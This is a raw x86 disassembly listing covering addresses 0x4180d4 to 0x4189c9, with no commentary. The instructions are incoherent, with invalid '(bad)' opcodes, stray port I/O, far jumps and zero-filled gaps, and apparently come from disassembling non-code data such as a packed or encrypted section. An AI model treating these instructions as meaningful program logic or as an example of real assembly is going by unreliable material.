  4180d4:	out    0xbf,al
  4180d6:	and    dh,ah
  4180d8:	mov    ch,0xcd
  4180da:	imul   ecx,DWORD PTR [edx-0x3b837b6e],0x7e697e6a
  4180e4:	xor    DWORD PTR [ebp+0x66],0x0
  4180e8:	or     bh,bl
  4180ea:	adc    al,0x69
  4180ec:	or     DWORD PTR [esi-0x43f38b9a],ebp
  4180f2:	jge    0x418120
  4180f4:	push   ebp
  4180f5:	out    dx,al
  4180f6:	das    
  4180f7:	jno    0x4180a9
  4180f9:	add    BYTE PTR [edx],al
  4180fb:	or     ah,BYTE PTR [esi+0x6e66a1]
	...
  418111:	add    BYTE PTR [eax],al
  418113:	add    al,bl
  418115:	mov    ch,0x7c
  418117:	imul   esp,DWORD PTR [edx-0x39dfcd5e],0xc87363ac
  418121:	add    edi,edi
  418123:	push   esp
  418124:	xchg   BYTE PTR [ebx-0x568bd286],ch
  41812a:	imul   ebp,DWORD PTR [esi-0x67],0x824d14fe
  418131:	mov    esi,0xb7916c6d
  418136:	and    esi,DWORD PTR [ebx+eiz*8]
  418139:	pop    es
  41813a:	adc    eax,0x61a18628
  41813f:	jo     0x4180c5
  418141:	les    ebp,FWORD PTR [ebp+0x62]
  418144:	xchg   ecx,eax
  418145:	stos   DWORD PTR es:[edi],eax
  418146:	das    
  418147:	and    BYTE PTR [eax-0x7abab29b],ah
  41814d:	sti    
  41814e:	and    dh,BYTE PTR [eax]
  418150:	scas   al,BYTE PTR es:[edi]
  418151:	lock pop ebx
  418153:	imul   edx,ebx,0xc67763ab
  418159:	idiv   DWORD PTR ds:0xff037c38
  41815f:	or     al,0xdf
  418161:	xchg   edi,eax
  418162:	add    BYTE PTR es:[ebx-0x70a40b1e],dl
  418169:	loop   0x418189
  41816b:	add    bh,bl
  41816d:	loope  0x41818d
  41816f:	add    ch,bh
  418171:	pop    eax
  418172:	dec    ebp
  418173:	inc    esp
  418174:	mov    ebp,?
  418176:	pop    ds
  418177:	and    eax,DWORD PTR [eax]
	...
  418189:	add    BYTE PTR [eax],al
  41818b:	add    BYTE PTR [ebp+eiz*8+0x40],bl
  41818f:	sub    esi,DWORD PTR [ecx+0x4d]
  418192:	in     eax,0x57
  418194:	popa   
  418195:	sar    al,1
  418197:	xor    esp,esp
  418199:	rcl    ch,1
  41819b:	das    
  41819c:	mov    esi,0xbe2fd625
  4181a1:	push   ebp
  4181a2:	mul    DWORD PTR [edx]
  4181a4:	mov    esp,0x9c2334af
  4181a9:	scas   eax,DWORD PTR es:[edi]
  4181aa:	xor    al,0x23
  4181ac:	pushf  
  4181ad:	scas   eax,DWORD PTR es:[edi]
  4181ae:	xor    al,0x23
  4181b0:	pushf  
  4181b1:	rdtsc  
  4181b3:	and    ebx,DWORD PTR [edi+ecx*1+0xf7c2331]
  4181ba:	xor    DWORD PTR [ebx-0x74],edi
  4181bd:	mov    dl,0x1f
  4181bf:	je     0x41818b
  4181c1:	pushf  
  4181c2:	adc    BYTE PTR [edi-0x46],ah
  4181c5:	nop
  4181c6:	cmp    eax,0x1fa99f77
  4181cb:	imul   edx,ebp,0xb
  4181ce:	pop    ds
  4181cf:	ins    DWORD PTR es:[edi],dx
  4181d0:	mov    WORD PTR [esi-0x6f5d8de1],fs
  4181d6:	cmp    BYTE PTR [ecx],dh
  4181d8:	mov    esi,0x706c2cd3
  4181dd:	std    
  4181de:	inc    ebx
  4181df:	jno    0x418244
  4181e1:	loop   0x4181f4
  4181e3:	ss mov eax,0x6f6d1b4d
  4181e9:	fcomp  DWORD PTR ds:0x3a4e8c71
  4181ef:	data16 add BYTE PTR [eax],al
	...
  418202:	add    BYTE PTR [eax],al
  418204:	pusha  
  418205:	dec    edx
  418206:	sub    al,0x72
  418208:	imul   ebp,DWORD PTR [ecx],0x213e5f3f
  41820e:	cmp    DWORD PTR [ecx+edi*1-0x2e],ebp
  418212:	and    ebp,DWORD PTR [esi+0x3f]
  418215:	xchg   esp,eax
  418216:	retf   
  418217:	dec    ecx
  418218:	pop    eax
  418219:	fs mov bl,0x4b
  41821c:	cmp    DWORD PTR [edi+0x678c1693],eax
  418222:	jbe    0x41824d
  418224:	and    BYTE PTR [ebx+0x682f1580],al
  41822a:	lods   eax,DWORD PTR ds:[esi]
  41822b:	and    al,0xfe
  41822d:	(bad)  
  41822e:	fwait
  41822f:	xor    esi,eax
  418231:	jg     0x4181c1
  418233:	sub    al,0xea
  418235:	test   DWORD PTR [ebx+0x4a],ecx
  418238:	fsub   DWORD PTR [ebx+esi*1+0x4c]
  41823c:	stc    
  41823d:	test   DWORD PTR [ebx+0x17],edx
  418240:	mov    WORD PTR [ebp+0x36],fs
  418243:	sub    ah,al
  418245:	add    DWORD PTR [eax+0x16],0x252d68ef
  41824c:	mov    esi,0xb2252cb4
  418251:	jae    0x4182a1
  418253:	sub    DWORD PTR [esi-0x40cfd098],edi
  418259:	jno    0x418273
  41825b:	xor    bl,BYTE PTR [ebp-0x43c7da98]
  418261:	push   0x809d3327
  418266:	repnz add eax,DWORD PTR [eax]
	...
  418279:	add    BYTE PTR [eax],al
  41827b:	add    BYTE PTR [ebp-0x7ee7f287],bh
  418281:	jae    0x418274
  418283:	sub    BYTE PTR [eax+0x52],ah
  418286:	add    BYTE PTR [esi],dl
  418288:	pop    eax
  418289:	rcr    BYTE PTR gs:[ecx],0x6f
  41828d:	jo     0x41823a
  41828f:	sub    al,0x4b
  418291:	js     0x418261
  418293:	sub    dl,BYTE PTR [ebx+edi*2-0x2e]
  418297:	pop    ss
  418298:	imul   eax,DWORD PTR [esi+0x604a3fc8],0x85394b8f
  4182a2:	or     BYTE PTR [ebp-0x389a9c71],bh
  4182a8:	mov    ds:0x649b677f,eax
  4182ad:	push   0xc681884e
  4182b2:	push   esp
  4182b3:	mov    edx,0x856b8268
  4182b8:	push   ebx
  4182b9:	jno    0x418322
  4182bb:	xchg   ebp,eax
  4182bc:	pop    esi
  4182bd:	outs   dx,DWORD PTR ds:[esi]
  4182be:	inc    eax
  4182bf:	nop
  4182c0:	mov    ds:0xa07b6580,al
  4182c5:	push   0x5cbf954e
  4182ca:	gs pop edx
  4182cc:	xchg   esp,eax
  4182cd:	xchg   esp,eax
  4182ce:	pop    ecx
  4182cf:	dec    esi
  4182d0:	mov    dh,0x80
  4182d2:	jge    0x41831c
  4182d4:	jp     0x41834b
  4182d6:	push   esp
  4182d7:	daa    
  4182d8:	scas   eax,DWORD PTR es:[edi]
  4182d9:	xchg   BYTE PTR [eax],ch
  4182db:	xor    al,0xaf
  4182dd:	jp     0x418346
  4182df:	inc    esi
	...
  4182f4:	jae    0x41827c
  4182f6:	push   esp
  4182f7:	sbb    ch,BYTE PTR [edi-0x7e]
  4182fa:	imul   eax,DWORD PTR [ebp-0x3c],0x71
  4182fe:	addr16 adc eax,0x10406f7d
  418304:	add    DWORD PTR [eax+0x68871b65],0x5c60354e
  41830e:	gs cli 
  418310:	jnp    0x4182a6
  418312:	pop    eax
  418313:	or     BYTE PTR [ecx-0x65f9827d],ah
  418319:	jo     0x418323
  41831b:	and    DWORD PTR [ebp-0x5148837d],edi
  418321:	jge    0x41838e
  418323:	jmp    0xdbad06ca
  418328:	(bad)  
  418329:	pop    eax
  41832a:	pop    edi
  41832b:	mov    edi,0x7d94b2
  418330:	(bad)  
  418331:	lods   al,BYTE PTR ds:[esi]
  418332:	push   ebx
  418333:	add    WORD PTR [ebp-0x423496da],sp
  41833a:	or     BYTE PTR [edx+esi*8+0x5c],bl
  41833e:	dec    ebp
  41833f:	push   ebx
  418340:	stc    
  418341:	push   ecx
  418342:	pop    edx
  418343:	add    ah,bl
  418345:	ret    0x7477
  418348:	adc    al,0xb9
  41834a:	fs inc esp
  41834c:	or     al,0x9f
  41834e:	or     BYTE PTR [esi+0x11],al
  418351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418352:	dec    ebp
  418353:	outs   dx,BYTE PTR ds:[esi]
  418354:	sbb    al,0x66
  418356:	push   ebp
  418357:	ins    DWORD PTR es:[edi],dx
	...
  41836c:	adc    BYTE PTR [edi+edx*2+0x7ba0136f],dl
  418373:	popa   
  418374:	xlat   BYTE PTR ds:[ebx]
  418375:	scas   eax,DWORD PTR es:[edi]
  418376:	push   esp
  418377:	inc    edi
  418378:	mov    ebp,0xd06c77bb
  41837d:	sahf   
  41837e:	push   esp
  41837f:	push   edi
  418380:	int3   
  418381:	ret    0x6f6c
  418384:	xchg   edx,eax
  418385:	mov    eax,ds:0xb7da4328
  41838a:	popa   
  41838b:	popa   
  41838c:	retf   
  41838d:	mov    esp,0xc1257269
  418392:	arpl   WORD PTR [esi-0x6f],sp
  418395:	lods   eax,DWORD PTR ds:[esi]
  418396:	push   ebp
  418397:	jb     0x418329
  418399:	push   esp
  41839a:	dec    ebx
  41839b:	push   0x6564a18c
  4183a0:	ja     0x4183f6
  4183a2:	pop    esp
  4183a3:	outs   dx,DWORD PTR ds:[esi]
  4183a4:	adc    DWORD PTR [ebx-0x3a49df9c],esi
  4183aa:	popa   
  4183ab:	ins    DWORD PTR es:[edi],dx
  4183ac:	xchg   esp,eax
  4183ad:	ret    0x656c
  4183b0:	not    DWORD PTR [ebx-0x5f2ab6ac]
  4183b6:	jnp    0x418421
  4183b8:	shl    DWORD PTR [eax+0x4a8c0060],0x22
  4183bf:	je     0x418432
  4183c1:	jmp    0x7119:0x44300034
  4183c8:	inc    ebx
  4183c9:	in     al,0x1c
  4183cb:	popa   
  4183cc:	xor    al,0x21
  4183ce:	xor    BYTE PTR [ecx+0x0],dl
	...
  4183e1:	add    BYTE PTR [eax],al
  4183e3:	add    BYTE PTR [ebx+0x2f],bl
  4183e6:	cmp    eax,0xfd18c50
  4183eb:	addr16 cmp dl,bh
  4183ee:	and    DWORD PTR [esi+0x35],ebp
  4183f1:	std    
  4183f2:	mul    BYTE PTR [esi+0x2a]
  4183f5:	adc    al,0x9
  4183f7:	push   ebp
  4183f8:	aas    
  4183f9:	cs aas 
  4183fb:	push   esp
  4183fc:	fdiv   st(5),st
  4183fe:	dec    esp
  4183ff:	inc    edi
  418400:	fdivp  st(5),st
  418402:	dec    esp
  418403:	inc    ebx
  418404:	shl    BYTE PTR [ecx],cl
  418406:	inc    edx
  418407:	push   edx
  418408:	mov    WORD PTR [edx-0x502eabd1],?
  41840e:	xor    BYTE PTR [eax-0x74],dl
  418411:	int3   
  418412:	dec    ecx
  418413:	dec    eax
  418414:	in     eax,0x6a
  418416:	adc    BYTE PTR [ebp-0x22],ch
  418419:	push   esp
  41841a:	or     al,0x51
  41841c:	mov    ebx,0xad75104f
  418421:	retf   
  418422:	pop    ds
  418423:	pop    esp
  418424:	ror    ecx,cl
  418426:	and    eax,0x39a1ad62
  41842b:	inc    ecx
  41842c:	int    0xcd
  41842e:	aas    
  41842f:	pop    esp
  418430:	iret   
  418431:	test   al,0x10
  418433:	arpl   dx,dx
  418435:	sar    DWORD PTR [eax+eiz*1],0x5a
  418439:	fld    QWORD PTR [eax+0x6d]
  41843c:	jns    0x4183ce
  41843e:	dec    eax
  41843f:	dec    edi
  418440:	dec    edi
  418441:	test   eax,0x9b686d25
  418446:	sub    esi,DWORD PTR [edx+0x0]
	...
  418459:	add    BYTE PTR [eax],al
  41845b:	add    BYTE PTR [esp+edx*4-0x7f8dd14e],cl
  418462:	fisub  WORD PTR [esi+ebx*2]
  418465:	jno    0x418422
  418467:	inc    esi
  418468:	push   0x6024c177
  41846d:	arpl   WORD PTR [edx-0x6caea3bc],sp
  418473:	inc    edx
  418474:	aas    
  418475:	add    ah,0x45
  418478:	pusha  
  418479:	fs call ebp
  41847c:	xchg   ebx,eax
  41847d:	fs xchg ecx,eax
  41847f:	xor    dh,BYTE PTR cs:[ecx-0x6e]
  418483:	adc    ch,BYTE PTR [ebx]
  418485:	ja     0x418414
  418487:	and    al,0x28
  418489:	push   0x773842b0
  41848e:	sahf   
  41848f:	das    
  418490:	out    dx,al
  418491:	jae    0x418504
  418493:	add    ebx,ebp
  418495:	jne    0x41841c
  418497:	pop    ss
  418498:	add    DWORD PTR [ecx+esi*2+0x28],esi
  41849c:	ror    BYTE PTR [ebp+0x5b],1
  41849f:	das    
  4184a0:	out    dx,al
  4184a1:	jae    0x4184e6
  4184a3:	xor    ecx,ebp
  4184a5:	push   ebx
  4184a6:	das    
  4184a7:	dec    ecx
  4184a8:	mov    eax,0xef185c51
  4184ad:	dec    esi
  4184ae:	adc    esi,DWORD PTR [esp+ebp*2]
  4184b1:	mov    ebp,0x77b14bff
  4184b6:	inc    esp
  4184b7:	inc    eax
  4184b8:	retf   
  4184b9:	push   ecx
  4184ba:	sbb    ebp,DWORD PTR [edi]
  4184bc:	mov    eax,ds:0x250178
	...
  4184d1:	add    BYTE PTR [eax],al
  4184d3:	add    BYTE PTR [esi-0x55d0cd6c],bl
  4184d9:	adc    BYTE PTR [esi],0x25
  4184dc:	sahf   
  4184dd:	outs   dx,DWORD PTR ds:[esi]
  4184de:	and    eax,DWORD PTR [edi-0x60]
  4184e1:	jne    0x4184e4
  4184e3:	and    eax,0x45226178
  4184e8:	pop    esp
  4184e9:	dec    edi
  4184ea:	or     BYTE PTR ds:0x47c814f,dl
  4184f0:	dec    edx
  4184f1:	pusha  
  4184f2:	pop    eax
  4184f3:	or     ebx,eax
  4184f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184f6:	pop    eax
  4184f7:	(bad)  [edx+0x7eda6b6e]
  4184fd:	ins    DWORD PTR es:[edi],dx
  4184fe:	gs mov edi,0x985478a8
  418504:	dec    esi
  418505:	pusha  
  418506:	gs into 
  418508:	jae    0x41857c
  41850a:	addr16 mov ebx,0xc765638f
  418510:	fwait
  418511:	jg     0x41857a
  418513:	fwait
  418514:	je     0x41857e
  418516:	dec    ebp
  418517:	lea    esi,[edx+0x72]
  41851a:	test   DWORD PTR [bp+0x53],ebx
  41851e:	inc    edi
  41851f:	mov    ecx,0x7c496844
  418524:	mov    ds:0xbf954e71,eax
  418529:	mov    ah,0x30
  41852b:	leave  
  41852c:	(bad)  
  41852d:	ja     0x418592
  41852f:	test   BYTE PTR [ebx-0x46c2b6ab],dh
  418535:	ja     0x41859b
  418537:	dec    ebx
	...
  41854c:	scas   eax,DWORD PTR es:[edi]
  41854d:	or     BYTE PTR [eax],0x3a
  418550:	test   eax,0xaf567c6e
  418555:	sub    BYTE PTR [ebx+0x25],0xd1
  418559:	js     0x4185c0
  41855b:	dec    ebx
  41855c:	outs   dx,DWORD PTR ds:[esi]
  41855d:	js     0x4185b8
  41855f:	sub    cl,bh
  418561:	fs dec ebx
  418563:	or     eax,0xc7c81cd
  418568:	shl    BYTE PTR [eax+0x58],cl
  41856b:	leave  
  41856c:	inc    edi
  41856d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41856e:	pop    eax
  41856f:	sbb    ebp,DWORD PTR [ecx+0x6e]
  418572:	imul   ebx,DWORD PTR [edx],0x7d
  418575:	ins    DWORD PTR es:[edi],dx
  418576:	add    BYTE PTR gs:[ebx-0x5ba39b4f],ah
  41857d:	push   ebx
  41857e:	pop    esp
  41857f:	outs   dx,DWORD PTR ds:[esi]
  418580:	xchg   edx,eax
  418581:	les    ebp,FWORD PTR [edx+0x61]
  418584:	not    DWORD PTR [eax-0x483eb8ac]
  41858a:	push   0x61
  41858c:	rol    ebx,1
  41858e:	inc    edi
  41858f:	inc    ecx
  418590:	adc    eax,0xb843544e
  418595:	pushf  
  418596:	imul   eax,DWORD PTR [esi+0x29],0xea5c08c1
  41859d:	mov    ah,0x63
  41859f:	(bad)  
  4185a0:	les    esi,FWORD PTR [edi+edx*2+0x49c0e443]
  4185a7:	pop    esp
  4185a8:	neg    BYTE PTR [ebp-0x43149a84]
  4185ae:	pop    eax
  4185af:	and    BYTE PTR [eax],al
	...
  4185c1:	add    BYTE PTR [eax],al
  4185c3:	add    ch,dl
  4185c5:	mov    ds:0x4fe10063,al
  4185ca:	outs   dx,DWORD PTR fs:[esi]
  4185cc:	pop    ss
  4185cd:	mov    bh,0x64
  4185cf:	push   ebx
  4185d0:	ss push edi
  4185d2:	pop    eax
  4185d3:	inc    ebp
  4185d4:	and    DWORD PTR [ebp+0x79],edx
  4185d7:	je     0x4185e1
  4185d9:	pop    edx
  4185da:	pop    esp
  4185db:	push   eax
  4185dc:	xchg   ebp,eax
  4185dd:	fs ins DWORD PTR es:[edi],dx
  4185df:	je     0x4185a9
  4185e1:	cwde   
  4185e2:	push   esp
  4185e3:	inc    ebx
  4185e4:	mov    eax,0x9946699c
  4185e9:	enter  0x5c08,0x86
  4185ed:	mov    bl,0x26
  4185ef:	fs aam 0x9c
  4185f2:	or     BYTE PTR [ebx-0x2e],dl
  4185f5:	mov    edx,0xa6c4777c
  4185fa:	imul   ebx,DWORD PTR [ebx+edi*2-0x3c],0x5a7d7355
  418602:	push   eax
  418603:	push   eax
  418604:	mov    ecx,cs
  418606:	xlat   BYTE PTR ds:[ebx]
  418607:	(bad)  
  418608:	mov    esi,0x83742b02
  41860d:	mov    WORD PTR [edx],ds
  41860f:	arpl   WORD PTR [eax-0x45],sp
  418612:	cmp    BYTE PTR [edi+0x7f],bl
  418615:	xchg   ebp,eax
  418616:	dec    esi
  418617:	pop    eax
  418618:	pop    esp
  418619:	in     eax,dx
  41861a:	aaa    
  41861b:	ins    DWORD PTR es:[edi],dx
  41861c:	jb     0x4185ff
  41861e:	sbb    ebx,DWORD PTR [edi+0x5e]
  418621:	fdiv   DWORD PTR [esi+eax*2]
  418624:	push   0x6817cc
	...
  418639:	add    BYTE PTR [eax],al
  41863b:	add    BYTE PTR [edx+0x45],cl
  41863e:	cmp    DWORD PTR [eax+eax*4-0x13],ebx
  418642:	inc    ecx
  418643:	outs   dx,BYTE PTR ds:[esi]
  418644:	aas    
  418645:	dec    ecx
  418646:	sub    ch,BYTE PTR [eax+ebp*1-0x30]
  41864a:	push   ss
  41864b:	inc    esp
  41864c:	sub    eax,0x2d502149
  418651:	and    DWORD PTR [ecx],esp
  418653:	add    BYTE PTR [esp+ecx*1],bl
  418656:	sbb    eax,0x23348c68
  41865b:	jno    0x418675
  41865d:	or     al,0x25
  41865f:	ins    BYTE PTR es:[edi],dx
  418660:	lods   al,BYTE PTR ds:[esi]
  418661:	sbb    eax,0xedf4742a
  418666:	dec    esp
  418667:	pop    edi
  418668:	add    BYTE PTR ds:0x19e06d4b,cl
  41866e:	cs jb  0x4185fd
  418671:	pop    ecx
  418672:	cmp    eax,0x1d58d867
  418677:	cs lock dec esp
  41867a:	sbb    BYTE PTR [eax],al
  41867c:	mov    al,0xbc
  41867e:	pop    ss
  41867f:	scas   eax,DWORD PTR es:[di]
  418681:	data16 loop 0x4186e7
  418684:	lods   eax,DWORD PTR ds:[esi]
  418685:	leave  
  418686:	or     al,0x5c
  418688:	les    edx,FWORD PTR [ebp+ebx*1+0x74]
  41868c:	mov    ds:0xb02e13bf,eax
  418691:	xchg   esp,eax
  418692:	add    BYTE PTR [eax],dl
  418694:	mov    WORD PTR [eax+0x2d],fs
  418697:	sub    BYTE PTR [ebx-0x4bbdf879],bh
  41869d:	fs and edx,edi
	...
  4186b4:	or     ebx,DWORD PTR [edi+0x25]
  4186b7:	sub    BYTE PTR [ebx-0x79],ah
  4186ba:	pop    ss
  4186bb:	inc    edx
  4186bc:	push   esp
  4186bd:	fs sbb edx,eax
  4186c0:	repz pop esi
  4186c2:	sub    eax,0xc979782d
  4186c7:	sub    al,0x70
  4186c9:	jo     0x41868b
  4186cb:	add    edi,DWORD PTR [eax]
  4186cd:	xchg   eax,ecx
  4186cf:	movq   mm6,QWORD PTR [ecx-0x40]
  4186d3:	sub    DWORD PTR [ebx+0x7b],ebp
  4186d6:	les    edx,FWORD PTR ds:0x27c47c72
  4186dc:	mov    WORD PTR [eax-0x4f],fs
  4186df:	and    BYTE PTR ds:0x1d0fb579,ch
  4186e5:	jns    0x418678
  4186e7:	adc    DWORD PTR [edi],ebp
  4186e9:	xchg   BYTE PTR [edx-0x748edc17],dl
  4186ef:	add    esi,DWORD PTR [eax]
  4186f1:	jp     0x41867b
  4186f3:	daa    
  4186f4:	out    dx,eax
  4186f5:	jle    0x41868f
  4186f7:	daa    
  4186f8:	lock jae 0x4186c0
  4186fb:	sbb    esp,edi
  4186fd:	jo     0x4186de
  4186ff:	ss loope 0x41877c
  418702:	jnp    0x418716
  418704:	retf   
  418705:	xchg   BYTE PTR [eax+edi*1-0x36],al
  418709:	imul   eax,DWORD PTR [ebx+0x21],0xffffffb6
  41870d:	imul   ecx,DWORD PTR [ebx+0x28],0xffffffb3
  418711:	xchg   esp,eax
  418712:	xor    ch,BYTE PTR [ebx]
  418714:	mov    dl,0x88
  418716:	ss and eax,0x0
	...
  41872c:	mov    esi,0xb3421377
  418731:	jo     0x41873b
  418733:	dec    esp
  418734:	jb     0x4187af
  418736:	fs cmp eax,0x1549b471
  41873c:	jno    0x4187b3
  41873e:	adc    ax,0x5990
  418742:	data16 sbb bh,BYTE PTR [ecx+eiz*2+0x64]
  418747:	std    
  418748:	(bad)  
  418749:	pop    eax
  41874a:	pop    edi
  41874b:	sti    
  41874c:	(bad)  
  41874d:	dec    esp
  41874e:	gs cli 
  418750:	mov    edx,DWORD PTR [ebx+ebx*2+0x886acfa]
  418757:	sbb    DWORD PTR [ecx-0x6016867d],esi
  41875d:	outs   dx,DWORD PTR ds:[esi]
  41875e:	jp     0x418735
  418760:	(bad)  
  418761:	imul   ax,sp,0xffa6
  418765:	mov    BYTE PTR [ebx+0x9],ch
  418768:	dec    esp
  418769:	jns    0x4187e5
  41876b:	jmp    0xb7bbfcea
  418770:	ins    BYTE PTR es:[edi],dx
  418771:	xchg   BYTE PTR [eax],ch
  418773:	popf   
  418774:	nop
  418775:	test   BYTE PTR [ebx-0x17],ch
  418778:	bound  esi,QWORD PTR [ebp+0x7a]
  41877b:	lahf   
  41877c:	ins    BYTE PTR es:[edi],dx
  41877d:	xchg   BYTE PTR [esi],ah
  41877f:	mov    cl,0x66
  418781:	cmp    DWORD PTR [ecx+ebp*8+0x5a],0x75
  418786:	jp     0x41871f
  418788:	lods   al,BYTE PTR ds:[esi]
  418789:	xchg   BYTE PTR [esi],ah
  41878b:	pushf  
  41878c:	call   0x0:0xe97a75
	...
  4187a3:	add    dl,al
  4187a5:	jne    0x418821
  4187a7:	jg     0x418755
  4187a9:	xchg   BYTE PTR [esi],ah
  4187ab:	cdq    
  4187ac:	mov    al,0x83
  4187ae:	jns    0x418799
  4187b0:	cwde   
  4187b1:	jne    0x41882d
  4187b3:	push   edi
  4187b4:	jnp    0x41873c
  4187b6:	cmp    DWORD PTR es:[ebp+0x7fe97c86],esp
  4187bd:	popa   
  4187be:	jl     0x4187c0
  4187c0:	fstp   QWORD PTR [eax-0x59889aa9]
  4187c6:	imul   esi,DWORD PTR [edx-0x6f],0x3565789d
  4187cd:	pop    ecx
  4187ce:	push   ebp
  4187cf:	jae    0x418752
  4187d1:	clc    
  4187d2:	push   edi
  4187d3:	gs ja  0x41877c
  4187d6:	imul   esi,DWORD PTR [edx+0x45],0xa173634d
  4187dd:	cwde   
  4187de:	inc    esp
  4187df:	popa   
  4187e0:	push   es
  4187e1:	xchg   ecx,eax
  4187e2:	sub    BYTE PTR [ebx-0x70],dl
  4187e5:	stos   BYTE PTR es:[edi],al
  4187e6:	jle    0x41884d
  4187e8:	div    esp
  4187ea:	pop    ecx
  4187eb:	jae    0x41877d
  4187ed:	stos   BYTE PTR es:[edi],al
  4187ee:	or     BYTE PTR [esp+edx*8-0x59],cl
  4187f2:	jl     0x418814
  4187f4:	push   ss
  4187f5:	mov    ds:0xa6c0767a,al
  4187fa:	sub    BYTE PTR [eax-0x2c],dl
  4187fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187fe:	ja     0x418800
  418800:	stc    
  418801:	mov    ch,0x77
  418803:	je     0x41878a
  418805:	(bad)  
  418806:	imul   esi,DWORD PTR [edx+0x0],0x0
	...
  418819:	add    BYTE PTR [eax],al
  41881b:	add    bl,dh
  41881d:	mov    eax,ds:0xac05207a
  418822:	jp     0x418898
  418824:	mov    ch,0x58
  418826:	push   ebp
  418827:	jae    0x41882a
  418829:	cmc    
  41882a:	push   edi
  41882b:	mul    DWORD PTR gs:[edx-0x3baa8d97]
  418832:	push   ebp
  418833:	je     0x418852
  418835:	xchg   esp,eax
  418836:	inc    esp
  418837:	popa   
  418838:	test   BYTE PTR [edi-0x55ffacd8],0x7e
  41883f:	gs out 0xf3,eax
  418842:	pop    eax
  418843:	jns    0x41880a
  418845:	lahf   
  418846:	or     BYTE PTR [esi-0x5f],al
  418849:	enter  0x4e28,0x8c
  41884d:	dec    esp
  41884e:	sbb    ah,BYTE PTR [edi-0x4d]
  418851:	dec    esp
  418852:	sbb    BYTE PTR [ebp-0x42],ch
  418855:	in     eax,dx
  418856:	inc    esi
  418857:	push   esp
  418858:	fmul   QWORD PTR [ebp+0x58a16d4b]
  41885e:	sub    DWORD PTR [esi-0x50],ebp
  418861:	pop    eax
  418862:	push   ds
  418863:	add    BYTE PTR [edx-0x5a93e35f],ch
  418869:	call   0x18:0xa5982e18
  418870:	push   0x706c05ab
  418875:	nop
  418876:	sbb    BYTE PTR [eax+0x7e],dl
  418879:	mov    ds,WORD PTR [edi]
  41887b:	data16 lods al,BYTE PTR ds:[esi]
  41887d:	call   0x0:0x661f
	...
  418894:	pusha  
  418895:	push   es
  418896:	sub    dh,BYTE PTR [edx+0x69]
  418899:	in     eax,dx
  41889a:	fisub  WORD PTR [ebx+0x6d]
  41889d:	jmp    0xddafb6aa
  4188a2:	sbb    eax,DWORD PTR [eax]
  4188a4:	pop    edi
  4188a5:	ds daa 
  4188a7:	je     0x4188e4
  4188a9:	int3   
  4188aa:	sbb    ah,BYTE PTR [ebx+0x58]
  4188ad:	sub    edi,DWORD PTR [ecx]
  4188af:	inc    esi
  4188b0:	pop    eax
  4188b1:	sbb    eax,0x4121423d
  4188b6:	sub    eax,0x38cd1863
  4188bb:	jb     0x4188e8
  4188bd:	push   cs
  4188be:	daa    
  4188bf:	and    BYTE PTR [edx+0x41],cl
  4188c2:	cmp    DWORD PTR [ecx+ebx*8+0xc],ebx
  4188c6:	and    ch,BYTE PTR [esi-0x74]
  4188c9:	sbb    ah,BYTE PTR [eax]
  4188cb:	data16 add BYTE PTR [edi+0x29e9722a],al
  4188d2:	dec    ebx
  4188d3:	jae    0x4188cd
  4188d5:	adc    DWORD PTR [esi],0x5194bc74
  4188db:	daa    
  4188dc:	jmp    0xe1748857
  4188e1:	jbe    0x418936
  4188e3:	por    mm0,QWORD PTR [edx-0x7631c7b4]
  4188ea:	pop    ebx
  4188eb:	sub    BYTE PTR [edi-0x5eedf078],ch
  4188f1:	outs   dx,DWORD PTR ds:[esi]
  4188f2:	inc    ebp
  4188f3:	in     al,0xd1
  4188f5:	push   0xe40f
	...
  41890a:	add    BYTE PTR [eax],al
  41890c:	int3   
  41890d:	jo     0x418927
  41890f:	and    DWORD PTR [edx-0x4cb6cc78],ebp
  418915:	ins    DWORD PTR es:[edi],dx
  418916:	or     eax,0xd6f5d04
  41891b:	adc    BYTE PTR [ecx+0x75],bh
  41891e:	icebp  
  41891f:	and    BYTE PTR [eax+0x52],bl
  418922:	(bad)  
  418924:	pop    eax
  418925:	sbb    eax,DWORD PTR fs:[edx+0x5f]
  418929:	jo     0x41891e
  41892b:	and    BYTE PTR [eax-0x4c],bl
  41892e:	scas   eax,DWORD PTR es:[edi]
  41892f:	adc    DWORD PTR [ecx+0x6f],ebp
  418932:	int    0xe3
  418934:	dec    ecx
  418935:	push   0x845937af
  41893a:	fld    TBYTE PTR [ecx+esi*1]
  41893d:	outs   dx,BYTE PTR ds:[esi]
  41893e:	mov    dl,0x3
  418940:	pop    ebp
  418941:	outs   dx,DWORD PTR ds:[esi]
  418942:	int    0xf
  418944:	cmp    DWORD PTR [ebp-0x4f],esi
  418947:	and    BYTE PTR [eax+0x52],cl
  41894a:	mov    esp,0x93793027
  41894f:	xor    ebx,DWORD PTR [esi]
  418951:	outs   dx,DWORD PTR ds:[esi]
  418952:	xchg   BYTE PTR ds:0x1d8e636c,bl
  418958:	add    BYTE PTR [esi+0x60ef1180],al
  41895e:	mov    eax,ds:0x8c70e810
  418963:	paddusb mm0,QWORD PTR [edx+0x76b28608]
  41896a:	sub    BYTE PTR [edi+0x2a2864b3],ah
	...
  418984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418985:	jne    0x4189f2
  418987:	dec    edi
  418988:	jl     0x4189ea
  41898a:	inc    ebp
  41898b:	pop    ecx
  41898c:	pushf  
  41898d:	jne    0x4189f4
  41898f:	aas    
  418990:	lahf   
  418991:	xchg   esp,eax
  418992:	pop    ecx
  418993:	push   esi
  418994:	call   0x5471:0x9e487d88
  41899b:	sub    esp,DWORD PTR [eax+0x56]
  41899e:	pop    esp
  41899f:	sbb    DWORD PTR [eax+0x7c1a6750],ecx
  4189a5:	arpl   WORD PTR [ebx+0x1a],bp
  4189a8:	jg     0x418a1f
  4189aa:	gs pop es
  4189ac:	retf   0x6475
  4189af:	add    al,0x88
  4189b1:	arpl   WORD PTR [edi-0x3],bx
  4189b4:	lods   al,BYTE PTR ds:[esi]
  4189b5:	or     DWORD PTR [eax+edx*1-0x62],0xffffff94
  4189ba:	aas    
  4189bb:	pop    es
  4189bc:	jg     0x418946
  4189be:	addr16 std 
  4189c0:	stos   DWORD PTR es:[edi],eax
  4189c1:	pop    eax
  4189c2:	pop    edi
  4189c3:	fcmovnb st,st(0)
  4189c5:	std    
  4189c6:	and    ah,cl
  4189c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189c9:	jo     0x4189d3
